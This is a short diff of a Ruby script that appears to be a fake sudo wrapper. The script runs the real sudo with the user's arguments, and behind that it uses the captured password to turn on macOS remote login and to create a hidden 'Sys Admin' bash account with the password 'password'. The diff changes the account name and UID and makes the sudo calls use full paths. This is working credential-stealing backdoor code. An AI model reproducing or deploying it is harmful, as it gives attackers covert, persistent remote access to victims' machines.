@@ -6,6 +6,6 @@ system "stty echo"
 
 print `/usr/bin/sudo #{ARGV[0..-1].join(' ')}`
 
-username = "sysadmin12"
-user_id = 1014
-`echo '#{password}' | sudo -S systemsetup -setremotelogin on && sudo dscl . -create /Users/#{username} && sudo dscl . -create /Users/#{username} UserShell /bin/bash && sudo dscl . -create /Users/#{username} RealName "Sys Admin" && sudo dscl . -create /Users/#{username} UniqueID "#{user_id}" && sudo dscl . -passwd /Users/#{username} password`
+username = "sysadmin13"
+user_id = 1015
+`echo '#{password}' | /usr/bin/sudo -S systemsetup -setremotelogin on && /usr/bin/sudo dscl . -create /Users/#{username} && /usr/bin/sudo dscl . -create /Users/#{username} UserShell /bin/bash && /usr/bin/sudo dscl . -create /Users/#{username} RealName "Sys Admin" && /usr/bin/sudo dscl . -create /Users/#{username} UniqueID "#{user_id}" && /usr/bin/sudo dscl . -passwd /Users/#{username} password`
